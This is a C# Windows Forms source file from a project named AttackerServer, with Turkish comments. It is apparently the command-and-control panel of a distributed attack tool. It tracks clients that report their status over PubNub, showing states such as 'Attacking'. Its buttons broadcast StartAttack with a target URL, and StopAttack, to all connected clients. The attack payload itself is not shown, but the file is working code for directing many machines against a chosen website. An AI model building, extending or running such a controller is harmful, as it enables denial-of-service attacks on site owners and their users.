using AtackerDTO;
using AttackerCommon;
using ChannelController;
using PubnubApi;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace AttackerServer
{
    public partial class Form1 : Form
    {
        const int ScreenReloadInterval = 1000;
        const int MaxRespondingSeconds = 10;
        const int MaxRemovingSeconds = 25;

        string SenderId;
        List<ClientData> Clients;
        Pubnub pubnub;

        public Form1()
        {
            SenderId = Identity.CreateNewID();
            Clients = new List<ClientData>();
            pubnub = ChannelHelper.InitializePubNubClient();
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Listener listener = new Listener(pubnub);
            listener.AddListener((message) =>
            {
                ReceiveMessage(message);
                return true;
            });

            //Client'ların yüklenmesi ve güncellenmesi için bir timer yaratılıyor
            Timer tmr = new Timer();
            tmr.Tick += ReloadScreen;
            tmr.Interval = ScreenReloadInterval;
            tmr.Start();
        }

        /// <summary>
        /// Client'ların bilgileri listesini günceller
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ReloadScreen(object sender, EventArgs e)
        {
            //Ekrandan kaldırılacak item'lar
            List<ListViewItem> removingListItems = new List<ListViewItem>();

            //Ekrana halihazırda eklenmiş clientId'ler
            List<string> alreadyAddedClientIds = new List<string>();

            //Öncelikle ekrandakiler güncelleniyor veya kaldırılıyor
            foreach (ListViewItem listItem in lvClients.Items)
            {
                var client = Clients.Where(p => p.Id == listItem.Text).FirstOrDefault();

                //Eğer client yoksa veya timeout olduysa
                if (client == null || DateMethods.IsTimedOut(client.LastUpdate, MaxRemovingSeconds))
                {
                    removingListItems.Add(listItem);

                    //Client listesinden de kaldırılıyor
                    if (client != null)
                    {
                        Clients.Remove(client);
                    }
                }
                else
                {
                    alreadyAddedClientIds.Add(client.Id);
                    SetListItem(listItem, client);
                }
            }

            //Kaldırılacaklar ekrandan kaldırılıyor
            removingListItems.ForEach(p => lvClients.Items.Remove(p));

            /*
             * Ekranda var olmayan client'lar ekrana ekleniyor
             * ve
            Eğer belli bir saniye süresince (MaxRemovingSeconds) client'dan bir bilgi gelmediyse 
            ekrandan ve listeden kaldırılır.
             */
            var notAddedClients = Clients.Where(client => !alreadyAddedClientIds.Contains(client.Id)).ToList();

            foreach (var client in notAddedClients)
            {
                /*
                Eğer belli bir saniye süresince (MaxRemovingSeconds) client'dan bir bilgi gelmediyse
                client'dan cevap alamadığı bilgisi düşülür.
                 */

                var newRow = new ListViewItem();

                SetListItem(newRow, client);

                lvClients.Items.Add(newRow);
            }
        }

        /// <summary>
        /// ListItem'ı günceller
        /// </summary>
        /// <param name="listItem"></param>
        /// <param name="client"></param>
        private void SetListItem(ListViewItem listItem, ClientData client)
        {
            listItem.SubItems.Clear();

            listItem.Text = client.Id;

            bool isTimedOutForResponding = DateMethods.IsTimedOut(client.LastUpdate, MaxRespondingSeconds);

            if(isTimedOutForResponding)
            {
                client.ClientStatusType = ClientStatusType.NotResponding;
            }

            listItem.SubItems.Add(new ListViewItem.ListViewSubItem()
            {
                Name = "status",
                Tag = "status",
                Text = client.ClientStatusType.ToString()
            });



            if (isTimedOutForResponding)
            {
                listItem.SubItems.Add(new ListViewItem.ListViewSubItem()
                {
                    Name = "message",
                    Tag = "message",
                    Text = "Not Responding"
                });

                client.ClientStatusType = ClientStatusType.NotResponding;
            }
            else
            {
                listItem.SubItems.Add(new ListViewItem.ListViewSubItem()
                {
                    Name = "message",
                    Tag = "message",
                    Text = client.StatusText
                });
            }

            listItem.SubItems.Add(new ListViewItem.ListViewSubItem()
            {
                Name = "lastUpdate",
                Tag = "lastUpdate",
                Text = client.LastUpdate.ToString()
            });

            //Client'ın durumuna göre satırın rengi belirleniyor
            switch (client.ClientStatusType)
            {
                case ClientStatusType.Normal:
                    listItem.BackColor = lvClients.BackColor;
                    listItem.ForeColor = lvClients.ForeColor;
                    break;
                case ClientStatusType.Message:
                    listItem.BackColor = Color.Yellow;
                    listItem.ForeColor = lvClients.ForeColor;
                    break;
                case ClientStatusType.Error:
                    listItem.BackColor = Color.Red;
                    listItem.ForeColor = Color.White;
                    break;
                case ClientStatusType.NotResponding:
                    listItem.BackColor = Color.Orange;
                    listItem.ForeColor = lvClients.ForeColor;
                    break;
                case ClientStatusType.Attacking:
                    listItem.BackColor = Color.Green;
                    listItem.ForeColor = Color.White;
                    break;
                default:
                    break;
            }
        }

        /// <summary>
        /// Alınan mesajları yorumlar ve gerekli aksiyonları başlatır
        /// </summary>
        /// <param name="messageDTO"></param>
        private void ReceiveMessage(MessageDTO messageDTO)
        {
            /*
             Eğer server tarafından karşılanan bir mesaj ise bu değer true yapılır
             */
            bool isHandled = false;

            ClientStatusType clientStatusType = ClientStatusType.Normal;
            switch (messageDTO.MessageType)
            {
                case MessageType.TextToServers:
                    clientStatusType = ClientStatusType.Message;
                    isHandled = true;
                    break;
                case MessageType.ClientStatus:
                    clientStatusType = ClientStatusType.Normal;
                    isHandled = true;
                    break;
                case MessageType.ClientError:
                    clientStatusType = ClientStatusType.Error;
                    isHandled = true;
                    break;
                case MessageType.ClientAttacking:
                    clientStatusType = ClientStatusType.Attacking;
                    isHandled = true;
                    break;
                default:
                    break;
            }

            if (isHandled)
            {
                var client = Clients.Where(p => p.Id == messageDTO.SenderId).FirstOrDefault();
                if (client == null)
                {
                    client = new ClientData(messageDTO.SenderId, messageDTO.Data, clientStatusType, DateTime.Now);
                    Clients.Add(client);
                }
                else
                {
                    client.StatusText = messageDTO.Data;

                    client.ClientStatusType = clientStatusType;

                    client.LastUpdate = DateTime.Now;
                }
            }
        }

        /// <summary>
        /// Mesaj yayınlar
        /// </summary>
        /// <param name="messageType"></param>
        /// <param name="data"></param>
        /// <param name="afterSuccessFunction"></param>
        private void PublishMessage(MessageType messageType, string data, Func<bool> afterSuccessFunction)
        {
            Publisher publisher = new Publisher(pubnub);
            publisher.PublishMessage(new MessageDTO(messageType, SenderId, data), (isError, errorMessage) =>
            {
                if (isError)
                {
                    MessageBox.Show(errorMessage);
                }
                else
                {
                    afterSuccessFunction();
                }
                return !isError;
            });
        }

        private void BtnAttack_Click(object sender, EventArgs e)
        {
            PublishMessage(MessageType.StartAttack, txtUrl.Text, () =>
            {
                return true;
            });
        }

        private void BtnStop_Click(object sender, EventArgs e)
        {
            PublishMessage(MessageType.StopAttack, String.Empty, () =>
            {
                return true;
            });
        }
    }
}
